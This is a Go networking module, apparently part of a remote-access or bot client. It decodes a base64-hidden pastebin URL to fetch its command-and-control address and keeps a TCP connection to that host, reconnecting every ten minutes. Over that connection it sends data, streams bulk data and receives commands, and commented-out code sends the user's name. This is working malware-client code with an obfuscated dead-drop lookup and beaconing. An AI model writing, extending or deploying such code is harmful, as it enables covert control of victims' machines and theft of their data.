package network

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"strings"

	"../base64"
	"../utils"
)

var Connection net.Conn
var ip string

func Connect() {
	ip = GetIp()
	_, err := net.Dial("tcp", ip)
	if err != nil {
		fmt.Println("error")
		utils.Wait(160)
		Connect()
	}
	fmt.Println("connected!")
	Connection, _ = net.Dial("tcp", ip)
}

func Reconnect() {
	//Every 10 mins
	for {
		utils.Wait(60 * 10)
		Connect()
	}
}

func GetIp() string {
	resp, _ := http.Get(base64.Base64Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)

	return strings.TrimLeft(string(respBody), "tcp://")
}

func Send(pre string, msg string) {
	Connection.Write([]byte(pre + "|" + msg)) //var c is located in client.go
}

/*func ReciveCommand() (cmd string, target string, args string, date int64) {
	msg, err := capnp.NewDecoder(c).Decode()
	if err != nil {
		panic(err)
	}
	// Extract the root struct from the message.
	commad, err := network.ReadRootCommand(msg)
	if err != nil {
		panic(err)
	}

	// Access fields from the struct.
	cmd, _ = commad.Cmd()
	target, _ = commad.Target()
	args, _ = commad.Args()
	date = commad.Date()
	return
}

func SendData(data string) {
	msg, seg, err := capnp.NewMessage(capnp.SingleSegment(nil))
	if err != nil {
		panic(err)
	}

	// Create a newclient. Book struct.  Every message must have a root struct.
	cnp, err := network.NewRootCommand(seg)
	if err != nil {
		panic(err)
	}
	// id
	cnp.SetCmd(GetUsername())
	//Target blanc
	cnp.SetTarget("")
	// Data
	cnp.SetArgs(data)
	cnp.SetDate(time.Now().Unix()) // Set int date
	err = capnp.NewEncoder(c).Encode(msg)
	if err != nil {
		panic(err)
	}
}
*/

func SendBig(data io.Reader) {
	io.Copy(Connection, data)
}

func Receive() string {
	status, err := bufio.NewReader(Connection).ReadString('\n')
	if err != nil {
		Connect()
	}

	return status
}
